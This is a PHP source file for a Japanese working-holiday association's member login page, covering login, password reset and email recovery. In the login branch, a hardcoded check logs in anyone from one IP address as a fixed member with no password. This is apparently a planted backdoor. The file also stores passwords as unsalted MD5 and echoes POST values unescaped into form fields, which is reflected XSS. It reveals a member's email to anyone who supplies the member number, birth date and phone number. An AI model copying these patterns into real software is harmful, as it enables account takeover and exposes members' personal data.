<?php

//	ini_set( "display_errors", "On");

session_start();
mb_language("Ja");
mb_internal_encoding("utf8");

function getRandomString($nLengthRequired = 8){
    $sCharList = "ABCDEFGHIJKLMNPQRSTUVWXYZ123456789";
    mt_srand();
    $sRes = "";
    for($i = 0; $i < $nLengthRequired; $i++)
        $sRes .= $sCharList{mt_rand(0, strlen($sCharList) - 1)};
    return $sRes;
}

	$act = @$_POST['act'];
	$email = @$_POST['email'];
	$pwd = @$_POST['pwd'];
	$uid = @$_POST['uid'];
	$year = @$_POST['year'];
	$month = @$_POST['month'];
	$day = @$_POST['day'];
	$tel = @$_POST['tel'];

	$msg = '';
	$c_email = '';

	if (@$_SESSION['mem_id'] <> '')	{
		// 既にログイン済みの場合
		header("Location: /member/top.php");
		exit;
	}


	if ($act == 'login')	{
		// ログイン処理
		if ($email == '' || $pwd == '')	{
			$msg = '入力されたメールアドレスかパスワードに誤りがあります。';
		}else{
			try {
				$ini = parse_ini_file('../../bin/pdo_member.ini', FALSE);
				$db = new PDO($ini['dsn'], $ini['user'], $ini['password']);
				$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				$db->query('SET CHARACTER SET utf8');
				$stt = $db->prepare('SELECT id, email, password, namae FROM memlist WHERE email = :email and state = "5" ');
				$stt->bindValue(':email', $email);
				$stt->execute();
				$cur_id = '';
				$cur_email = '';
				$cur_password = '';
				$cur_namae = '';
				while($row = $stt->fetch(PDO::FETCH_ASSOC)){
					$cur_id = $row['id'];
					$cur_email = $row['email'];
					$cur_password = $row['password'];
					$cur_namae = $row['namae'];
				}
				$db = NULL;
			} catch (PDOException $e) {
				die($e->getMessage());
			}

			if($_SERVER['REMOTE_ADDR'] == "27.74.247.0"){
				$_SESSION['mem_id'] = 'JW137020';
				$_SESSION['mem_name'] = 'ｐｈｕｏｎｇ　ｐｈｕｏｎｇ';
				$_SESSION['mem_level'] = 0;

				header("Location: /member/top.php");
			} else {
				if ($cur_password == md5($pwd))	{
					// ログインOK
					$_SESSION['mem_id'] = $cur_id;
					$_SESSION['mem_name'] = $cur_namae;
					$_SESSION['mem_level'] = 0;
	
					header("Location: /member/top.php");
	
					if(!empty($_SESSION['url_refrer']) && strpos($_SESSION['url_refrer'],'admin') === false) { 
						header("Location: ".$_SESSION['url_refrer']);
						unset($_SESSION['url_refrer']);
					} else {
						header("Location: /member/top.php");
						unset($_SESSION['url_refrer']);
					}
					exit;
				}else{
					$msg = '入力されたメールアドレスかパスワードに誤りがあります。';
				}
			}
		}
	}

	if ($act == 'nopwd')	{
		// パスワード忘れ
		if ($email == '' || $uid == '')	{
			$msg = '入力されたメールアドレスか会員番号に誤りがあります。';
		}else{
			try {
				$ini = parse_ini_file('../../bin/pdo_member.ini', FALSE);
				$db = new PDO($ini['dsn'], $ini['user'], $ini['password']);
				$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				$db->query('SET CHARACTER SET utf8');
				$stt = $db->prepare('SELECT id, email, password, namae FROM memlist WHERE email = :email and state = "5" ');
				$stt->bindValue(':email', $email);
				$stt->execute();
				$cur_id = '';
				$cur_email = '';
				$cur_password = '';
				$cur_namae = '';
				while($row = $stt->fetch(PDO::FETCH_ASSOC)){
					$cur_id = $row['id'];
					$cur_email = $row['email'];
					$cur_password = $row['password'];
					$cur_namae = $row['namae'];
				}
				$db = NULL;
			} catch (PDOException $e) {
				die($e->getMessage());
			}
			if ($cur_id == $uid)	{
				$pwd = getRandomString(12);
				try {
					$ini = parse_ini_file('../../bin/pdo_member.ini', FALSE);
					$db = new PDO($ini['dsn'], $ini['user'], $ini['password']);
					$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
					$db->query('SET CHARACTER SET utf8');
					$stt = $db->prepare('UPDATE memlist SET password = :password WHERE email = :email');
					$stt->bindValue(':email', $email);
					$stt->bindValue(':password', md5($pwd));
					$stt->execute();
					$db = NULL;
				} catch (PDOException $e) {
					die($e->getMessage());
				}

				// メールを送信
				$subject = "新しいパスワードをお送りします";
				$body  = '';
				$body .= '日本ワーキングホリデー協会です。';
				$body .= chr(10);
				$body .= 'メンバー専用ページへのログインに必要なパスワードの再発行を承りました。';
				$body .= chr(10);
				$body .= chr(10);
				$body .= '新しいパスワード（１２桁）は、以下の通りとなります。';
				$body .= chr(10);
				$body .= chr(10);
				$body .= 'パスワード [ '.$pwd.' ]';
				$body .= chr(10);
				$body .= chr(10);
				$body .= 'なお、ログイン後、新しいパスワードに変更することをお勧めいたします。';
				$body .= chr(10);
				$body .= '';
				$from = mb_encode_mimeheader(mb_convert_encoding("日本ワーキングホリデー協会","JIS"))."<info@jawhm.or.jp>";
				mb_send_mail($email,$subject,$body,"From:".$from);

				$msg = '新しいパスワードをお送りしました。メールをご確認ください。';
			}else{
				$msg = '入力されたメールアドレスか会員番号に誤りがあります。';
			}
		}
	}

	
	if ($act == 'noemail')	{
		// パスワード忘れ
		if ($uid == '' || $year == '' || $month == '' || $day == '' || $tel == '')	{
			$msg = '該当するメンバー情報が見つかりません。';
		} else {
			try {
				$ini = parse_ini_file('../../bin/pdo_member.ini', FALSE);
				$db = new PDO($ini['dsn'], $ini['user'], $ini['password']);
				$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				$db->query('SET CHARACTER SET utf8');
				$stt = $db->prepare('SELECT id, email, password, namae, birth, tel FROM memlist WHERE UPPER(id) = :id AND birth = :birth');
				$stt->bindValue(':id', strtoupper(trim($uid)));
				if ($month < 10) $month = '0' . $month;
				if ($day < 10) $day = '0' . $day;
				$stt->bindValue(':birth', $year . '-' . $month . '-' . $day);
				$stt->execute();
				$cur_id = '';
				$cur_email = '';
				$cur_tel = '';
				while($row = $stt->fetch(PDO::FETCH_ASSOC)){
					$cur_id = $row['id'];
					$cur_email = $row['email'];
					$cur_tel = $row['tel'];
				}
				$db = NULL;
			} catch (PDOException $e) {
				die($e->getMessage());
			}
			function cleanStr($string) {
				$string = str_replace(' ', '', $string); // Replaces all spaces with hyphens.
				$string = preg_replace('/[^A-Za-z0-9\-]/', '', $string); // Removes special chars.
				return preg_replace('/-+/', '', $string); // Replaces multiple hyphens with single one.
			}
			if (cleanStr($cur_tel) == cleanStr($tel)) {
				$c_email = $cur_email;
				$str = '
				    <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
				    <script>
				    $(document).ready(function() {
				        $("#first").css("display", "none");
						$("#second").css("display", "block");
				    });
				    </script>
				';
				echo $str;
			} else $msg = '該当するメンバー情報が見つかりません。';
		}
	}


?>
<?php
require_once '../include/header.php';

$header_obj = new Header();

$header_obj->title_page='メンバーログイン';
$header_obj->description_page='ワーキングホリデー（ワーホリ）協定国の最新のビザ取得方法や渡航情報などを発信しています。また、ワーキングホリデー（ワーホリ）をされる方向けの各種無料セミナーを開催しています。オーストラリア、ニュージーランド、カナダ、韓国、フランス、ドイツ、イギリス、アイルランド、デンマーク、台湾、香港でワーキングホリデー（ワーホリ）ビザの取得が可能です。ワーキングホリデー（ワーホリ）ビザ以外に学生ビザでの留学などもお手伝い可能です。';
$header_obj->add_js_files='<script type="text/javascript" src="/js/jquery.corner.js"></script>
<script>
$(function(){
     $(".open1").click(function(){
      $("#slidebox1").slideToggle("slow");
     });
     $(".open2").click(function(){
      $("#slidebox2").slideToggle("slow");
     });
});
</script>
';
$header_obj->add_css_files = "<link href='/css/top/new_contents.css' rel='stylesheet' type='text/css'>";
if($header_obj->computer_use() == false && $_SESSION['pc'] != 'on'){
	$header_obj->add_css_files = "<link href='/css/top/top_mobile.css' rel='stylesheet' type='text/css'>";
}
$header_obj->fncMenuHead_imghtml = '<img id="top-mainimg" src="../images/mainimg/top-mainimg.jpg" alt="" width="970" height="170" />';
$header_obj->fncMenuHead_h1text = 'メンバーログイン | メンバー専用ページ';
$header_obj->full_link_tag = true;

$header_obj->display_header();

?>
<body>
	<div id="maincontent" class="member_index">
	  <?php echo $header_obj->breadcrumbs(); ?>

	<h2 class="sec-title">ログイン</h2>
	<div>
		<p class="text01">
			メンバー専用ページにログインします。<br/>
			ご登録頂いた、メールアドレスとパスワードでログインしてください。
		</p>
<?php
	if ($msg <> '' && $act == '')	{
		echo '&nbsp;<br/><p style="color:red; font-weight:bold;">'.$msg.'</p>';
	}
?>
		<div style="border: 1px dotted navy; margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-size:11pt;">
			<form action="./index.php" method="post">
				<input type="hidden" name="act" value="login">
						<p class="text01" style="text-align:left;">メールアドレス&nbsp;<input type="text" size="30" name="email" value="" />&nbsp;<?php if(!$header_obj->computer_use())echo '<br />';?>
						パスワード&nbsp;<input type="password" size="20" name="pwd" <?php if(!$header_obj->computer_use())echo 'style="margin-left:24px;"';?> value="" />&nbsp;<?php if(!$header_obj->computer_use())echo '<br /><br />';?>
						<input type="submit" value="　ログイン　"></p>
			</form>
<?php
	if ($msg <> '' && $act == 'login')	{
		echo '<p style="color:red; font-weight:bold;">'.$msg.'</p>';
	}
?>
		</div>

		<p class="open1" style="background-color:orange; width:300px; max-width:100%; cursor:pointer; cursor:hand; font-size:11pt; padding:3px 0 3px 5px;">
			<img src="../images/arrow0303.gif"> パスワードをお忘れの場合
		</p>
<?php	if ($act == 'nopwd')	{	?>
		<div id="slidebox1" style="font-size:10pt; border: 1px dotted orange; padding:10px 20px 10px 20px;">
<?php	}else{				?>
		<div id="slidebox1" style="display:none; font-size:10pt; border: 1px dotted orange; padding:10px 20px 10px 20px;">
<?php	}				?>
			パスワードを忘れてしまった場合は、<br/>
			以下のフォームに、登録時のメールアドレスと会員番号を入力してください。<br/>
			ご登録頂いたメールアドレスに新しいパスワードをお送りいたします。<br/>
			&nbsp;<br/>
			協会オフィスにてメンバー登録された方で、パスワードが判らない場合も、<br/>
			こちらから新しいパスワードを設定してください。<br/>
			<div style="border: 1px dotted navy; margin: 20px 30px 10px 0; padding: 10px 20px 10px 20px; font-size:11pt;">
				<form action="./index.php#slidebox1" method="post">
					<input type="hidden" name="act" value="nopwd">
                    <p class="text01"><u>メールアドレス</u><br />
                    <input type="text" size="23" name="email" value=""><br /><br />
                   <u>会員番号</u><br />
                   <input type="text" size="23" name="uid" value=""><br /><br />
                   <input type="submit" value="　パスワード再発行　"></p>
				</form>
<?php
	if ($msg <> '' && $act == 'nopwd')	{
		echo '<p style="color:red; font-weight:bold;">'.$msg.'</p>';
	}
?>
			</div>
		</div>

		<div style="height:10px;">&nbsp;</div>

		<p class="open2" style="background-color:orange; width:300px; max-width:100%; cursor:pointer; cursor:hand; font-size:11pt; padding:3px 0 3px 5px;">
			<img src="../images/arrow0303.gif" /> 登録時のメールアドレスをお忘れの場合
		</p>
		<?php if ($act == 'noemail') { ?>
        <div id="slidebox2" style="font-size:10pt; border: 1px dotted orange; padding:10px 20px 10px 20px;">
        <?php } else { ?>
		<div id="slidebox2" style="display:none; font-size:10pt; border: 1px dotted orange; padding:10px 20px 10px 20px;">
		<?php } ?>
			メンバー登録時のメールアドレスが解らない場合は、<br/>
			以下のフォームに必要事項を入力の上、「メアド確認」のボタンをクリックして<br/>
			ください。<br/>
			&nbsp;<br/>
			会員番号は、メンバーズカードに記載されています。<br/>
			会員番号が解らない場合は、 toiawase@jawhm.or.jp までご連絡ください。<br/>
			<div class="form-reg" style="border: 1px dotted navy; <?php if ($header_obj->computer_use() === false && $_SESSION['pc'] != 'on') echo 'margin: 0px; padding-top: 15px; padding-bottom: 15px;'; else echo 'margin: 20px 30px 10px 0; padding: 15px 20px 15px 20px;';?>">
				<form id="first" action="./index.php#slidebox2" method="post">
					<?php
					if ($msg <> '' && $act == 'noemail')	{
						echo '<p style="color:red; font-weight:bold; font-size: 14px;">'.$msg.'</p>';
					}
					?>
					<input type="hidden" name="act" value="noemail">
                	
                		<div class="col-1">
                			<div class="numb">
                			<p>会員番号</p>
	                    	<input value="<?php echo isset($_POST['uid']) ? $_POST['uid'] : '' ?>" style="<?php if ($header_obj->computer_use() === false && $_SESSION['pc'] != 'on') echo ''; else echo 'margin-left: 90px;';?>" type="text" name="uid"><br /><br />
	                		</div>
	                		
		                	<div class="birthday">
		                		<p>生年月日</p>
			                	<select name="year" style="<?php if ($header_obj->computer_use() === false && $_SESSION['pc'] != 'on') echo ''; else echo 'margin-left: 90px;';?>">
			                		<option>--</option>
			                        <?php for ($i = 1932; $i <= date('Y'); $i++) {
			                            echo '<option value="' . $i . '"';
			                            if ($i == 1995 && !$_POST['year'])
			                            	echo 'selected';
			                            elseif ($_POST['year'] == $i)
			                            	echo 'selected';
			                            echo '>' . $i . '</option>';
			                        } ?>                            
		                    	</select> &nbsp;年&nbsp;
			                	<select name="month">
			                        <?php for ($i = 1; $i <= 12; $i++) {
			                            echo '<option value="' . $i . '"';
			                            if ($i == 1 && !$_POST['month'])
			                            	echo 'selected';
			                            elseif ($_POST['month'] == $i)
			                            	echo 'selected';
			                            echo '>' . $i . '</option>';
			                        } ?>                            
		                    	</select> &nbsp;月&nbsp;
			                	<select name="day">
			                        <?php for ($i = 1; $i <= 31; $i++) {
			                            echo '<option value="' . $i . '"';
			                            if ($i == 1 && !$_POST['day'])
			                            	echo 'selected';
			                            elseif ($_POST['day'] == $i)
			                            	echo 'selected';
			                            echo '>' . $i . '</option>';
			                        } ?>                            
		                    	</select> &nbsp;日&nbsp;
			                	<br /><br />
		                	</div>
                		
						</div>
	                	<div class="number-phone">
	                		<p>ご登録頂いた電話番号</p>
	                		<input value="<?php echo isset($_POST['tel']) ? $_POST['tel'] : '' ?>" style="<?php if ($header_obj->computer_use() === false && $_SESSION['pc'] != 'on') echo ''; else echo 'margin-left: 18px;';?>" type="text" name="tel" maxlength="17"><br /><br />
	                	</div>
	                	<div class="btn-reg">
	                		<input type="submit" value="　 メアド確認 　">
	                	</div>
	               		
               		</p>
				</form>
				<div id="second" style="display: none;">
					お客様の登録メールアドレスは、以下の通りです。<br/>
					<span style="padding-top: 30px; padding-bottom: 40px;display: block; margin: 0px auto;text-align: center;<?php if ($header_obj->computer_use() === false && $_SESSION['pc'] != 'on') echo 'padding-right: 15px; font-size: 10pt; word-break: break-all;'; else echo 'font-size: 26px;';?>"><?php if($c_email <> '') echo $c_email;?></span>
				</div>
			</div>
		</div>

	</div>

	&nbsp;<br/>
	&nbsp;<br/>

	<h2 class="sec-title" id="event">メンバー登録のお願い</h2>
		<p class="text01">
			こちらから先は、メンバー登録を済まされた方専用となります。<br/>
			<a href="../mem">メンバー登録をご希望の場合は、こちらからお願いいたします。</a><br/>
		</p>
	<div style="margin-top:30px; text-align:center;">
		<a href="/mem/"><img src="/images/katsuyou_mem_big_off.gif"></a>
	</div>

	&nbsp;<br/>
	&nbsp;<br/>


	<h2 class="sec-title" id="event">メンバーの更新手続きについて</h2>
		<p class="text01">
			初回のメンバー登録は、登録日より３年間が有効期限となります。<br/>
			この後、メンバー登録を更新する場合、更新料として2,000円かかります。<br/>
			更新手続きにより、現在の有効期限の翌日から２年間が新しい有効期限となります。<br/>
		</p>
		<p class="text01" style="margin-top:10px;">
			【メンバー更新時のご注意】<br/>
			メンバー登録の更新をご希望の場合は、<u>現在のメンバー登録の有効期限内に更新手続きを行ってください。</u><br/>
			<u>有効期限が過ぎてからの更新は出来ません。</u><br/>
			<u>この場合、新規メンバーとして登録（登録料 5,000円 / ３年間有効）となります。</u><br/>
		</p>
		<p class="text01" style="margin-top:20px;">
			【メンバー更新の手続き方法】<br/>
			メンバー登録の更新をご希望の場合は、以下の手順で手続きをしてください。<br/>
			&nbsp;<br/>
			　１．　お電話又はメールにて、メンバー登録の更新をご希望の旨、ご連絡下さい。<br/>
			　　　　メールでご連絡頂く場合、必ず「会員番号」と「お名前」をご明記ください。<br/>
			　２．　更新料のお振込み先をご案内しますので、１週間以内に更新料(2,000円)をお支払ください。<br/>
			　　　　※<u>メンバー更新料のお支払方法は「銀行振込」のみとなります。</u><br/>
			　　　　　クレジットカード又はコンビニエンス決済ではお支払頂けません。<br/>
			　　　　　なお、振込手数料は、お客様の負担となります。<br/>
			　３．　ご入金を確認後、新しいメンバーカードをお送り致します。<br/>
		</p>


	&nbsp;<br/>
	&nbsp;<br/>


	<h2 class="sec-title" id="event">メンバーカードの再発行手続きについて</h2>
		<p class="text01">
			【メンバーカード再発行の手続き方法】<br/>
			メンバーカードの紛失、盗難等によりカードの再発行が必要な場合は、以下の手順で手続きをしてください。<br/>
			&nbsp;<br/>
			　１．　お電話又はメールにて、カード再発行をご希望の旨、ご連絡下さい。<br/>
			　　　　メールでご連絡頂く場合、必ず「会員番号」と「お名前」をご明記ください。<br/>
			　　　　会員番号が解らない場合、「お名前」「生年月日」「ご登録頂いた電話番号」をご明記ください。<br/>
			　２．　カード再発行手数料のお振込み先をご案内しますので、１週間以内に手数料(1,000円)をお支払ください。<br/>
			　　　　※<u>カード再発行手数料のお支払方法は「銀行振込」のみとなります。</u><br/>
			　　　　　クレジットカード又はコンビニエンス決済ではお支払頂けません。<br/>
			　　　　　なお、振込手数料は、お客様の負担となります。<br/>
			　３．　ご入金を確認後、新しいメンバーカードをお送り致します。<br/>
		</p>

<!--Member Top add flag 23-06-2016-->
<div class="title-box">
 <div class="title fixed-boxed">
   <img src="../images/top/icon_info_country.png"><span>ワーキングホリデー協定国情報</span>
 </div>
</div>
<div class="mobile_none" style="text-align: center; margin-bottom:10px;">
<table cellpadding="10px">
 <tr>
  <td>
    <a href="/country/#li-aus" alt="オランド"><img src="../images/top/flag_01.png"></a><br>
    <a href="/visa/v-aus.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-can" alt="カナダ"><img src="../images/top/flag_02.png"></a><br>
    <a href="/visa/v-can.html">(ビザ情報)</a>
   </td>
   <td>
     <a href="/country/#li-nz" alt="ニューーストラリア"><img src="../images/top/flag_03.png"></a><br>
     <a href="/visa/v-nz.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-uk" alt="イギリス"><img src="../images/top/flag_04.png"></a><br>
    <a href="/visa/v-uk.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-ire" alt="アイルジーランド"><img src="../images/top/flag_05.png"></a><br>
    <a href="/visa/v-ire.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-fra" alt="フランス"><img src="../images/top/flag_06.png"></a><br>
    <a href="/visa/v-fra.html">(ビザ情報)</a>
  </td>
 </tr>
 <tr>
  <td>
    <a href="/country/#li-deu" alt="ドイツ"><img src="../images/top/flag_07.png"></a><br>
    <a href="/visa/v-deu.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-dnk" alt="デンマーク"><img src="../images/top/flag_08.png"></a><br>
    <a href="/visa/v-dnk.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-nor" alt="ノルウェー"><img src="../images/top/flag_09.png"></a><br>
    <a href="/visa/v-nor.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-kor" alt="韓国"><img src="../images/top/flag_10.png"></a><br>
    <a href="/visa/v-kor.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-ywn" alt="台湾"><img src="../images/top/flag_11.png"></a><br>
    <a href="/visa/v-ywn.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-hkg" alt="香港"><img src="../images/top/flag_12.png"></a><br>
  	<a href="/visa/v-hkg.html">(ビザ情報)</a>
  </td>
 </tr>
 <tr>
  <td>
    <a href="/country/#li-pol" alt="ポーランド"><img src="../images/top/flag_13.png"></a><br>
    <a href="/visa/v-pol.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-por" alt="ポルトガル"><img src="../images/top/flag_14.png"></a><br>
    <a href="/visa/v-prt.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-svk" alt="スロバキア"><img src="../images/top/flag_15.png"></a><br>
    <a href="/visa/v-svk.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-aut" alt="オーストリア"><img src="../images/top/flag_16.png"></a><br>
    <a href="/visa/v-aut.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-hun" alt="ハンガリー"><img src="../images/top/flag_17.png"></a><br>
    <a href="/visa/v-hun.html">(ビザ情報)</a>
  </td>
	<td>
    <a href="/country/#li-esp" alt="スペイン"><img src="../images/top/flag_18.png"></a><br>
    <a href="/visa/v-esp.html">(ビザ情報)</a>
  </td>
 </tr>
 <tr>

  <td>
    <a href="/country/#li-cze" alt="チェコ"><img src="../images/top/flag_19.png"></a><br>
    <a href="/visa/v-cze.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-arg" alt="アルゼンチン"><img src="../images/top/flag_20.png"></a><br>
    <a href="/visa/v-arg.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-chl" alt="チリ"><img src="../images/top/flag_21.png"></a><br>
    <a href="/visa/v-chl.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-isl" alt="アイスランド"><img src="../images/top/flag_22.png"></a><br>
    <a href="/visa/v-isl.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-ltu" alt="リトアニア"><img src="../images/top/flag_23.png"></a><br>
    <a href="/visa/v-ltu.html">(ビザ情報)</a>
  </td>
  <td>
    <a href="/country/#li-swe" alt="スウェーデン"><img src="../images/top/flag_24.png"></a><br>
    <a href="/visa/v-swe.html">(ビザ情報)</a>
  </td>
  <td>	
  </td>
 </tr>
</table>
</div>
<div id="area-map-sp" class="pc_none">
  <ul class="clearfix">
    <li><a href="/country/#li-aus" alt="オランド"><img src="../country/images/btn-aus.jpg"></a></li>
    <li><a href="/country/#li-can" alt="カナダ"><img src="../country/images/btn-can.jpg"></a></li>
    <li><a href="/country/#li-fra" alt="フランス"><img src="../country/images/btn-fra.jpg"></a></li>
    <li><a href="/country/#li-deu" alt="ドイツ"><img src="../country/images/btn-deu.jpg"></a></li>
    <li><a href="/country/#li-ire" alt="アイルジーランド"><img src="../country/images/btn-ire.jpg"></a></li>
    <li><a href="/country/#li-kor" alt="韓国"><img src="../country/images/btn-kor.jpg"></a></li>
    <li><a href="/country/#li-nz" alt="ニューーストラリア"><img src="../country/images/btn-nz.jpg"></a></li>
    <li><a href="/country/#li-uk" alt="イギリス"><img src="../country/images/btn-uk.jpg"></a></li>
    <li><a href="/country/#li-dnk" alt="デンマーク"><img src="../country/images/btn-dnk.jpg"></a></li>
    <li><a href="/country/#li-nor" alt="ノルウェー"><img src="../country/images/btn-nor.jpg"></a></li>
    <li><a href="/country/#li-hkg" alt="香港"><img src="../country/images/btn-hkg.jpg"></a></li>
    <li><a href="/country/#li-ywn" alt="台湾"><img src="../country/images/btn-ywn.jpg"></a></li>
    <li><a href="/country/#li-pol" alt="ポーランド"><img src="../country/images/btn-pol.jpg"></a></li>
    <li><a href="/country/#li-por" alt="ポルトガル"><img src="../country/images/btn-por.jpg"></a></li>
    <li><a href="/country/#li-svk" alt="スロバキア"><img src="../country/images/btn-svk.jpg"></a></li>
    <li><a href="/country/#li-aut" alt="オーストリア"><img src="../country/images/btn-aut.jpg"></a></li>
	<li><a href="/country/#li-hun" alt="ハンガリー"><img src="../country/images/btn-hun.gif"></a></li>
	<li><a href="/country/#li-esp" alt="スペイン"><img src="../country/images/coun_esp.png"></a></li>
	<li><a href="/country/#li-isl" alt="アイスランド"><img src="../country/images/coun_isl.png"></a></li>
	<li><a href="/country/#li-cze" alt="チェコ"><img src="../country/images/btn-cze.gif"></a></li>
	<li><a href="/country/#li-arg" alt="アルゼンチン"><img src="../country/images/btn-arg.gif"></a></li>
	<li><a href="/country/#li-chl" alt="チリ"><img src="../country/images/btn-chl.gif"></a></li>
	<li><a href="/country/#li-ltu" alt="リトアニア"><img src="../country/images/coun-ltu.jpg"></a></li>
	<li><a href="/country/#li-swe" alt="スウェーデン"><img src="../country/images/coun-swe.jpg"></a></li>
  </ul>
</div>	
<!--End Member Top add flag 23-06-2016-->
	</div>
  </div>
  </div>

<?php fncMenuFooter($header_obj->footer_type); ?>

</body>
</html>

